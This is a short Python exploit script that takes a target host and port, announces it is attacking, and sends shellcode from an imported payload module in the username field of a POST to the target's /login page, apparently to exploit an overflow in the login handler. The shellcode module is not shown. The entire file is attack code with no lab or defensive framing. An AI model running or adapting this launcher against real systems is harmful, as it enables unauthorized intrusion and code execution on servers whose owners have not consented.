#!/usr/bin/env python3

import requests, sys, payload

if len(sys.argv) < 2:
    print('Usage: ./main.py <target> [port]')
    sys.exit(1)

target = sys.argv[1]
port = sys.argv[2] if len(sys.argv) > 2 else 80

print(f"[+] Attacking {target} at {port}")

res = requests.post(f'http://{target}:{port}/login', data={'username': payload.shellcode.encode('latin-1'), 'password': 'password'})

res.close()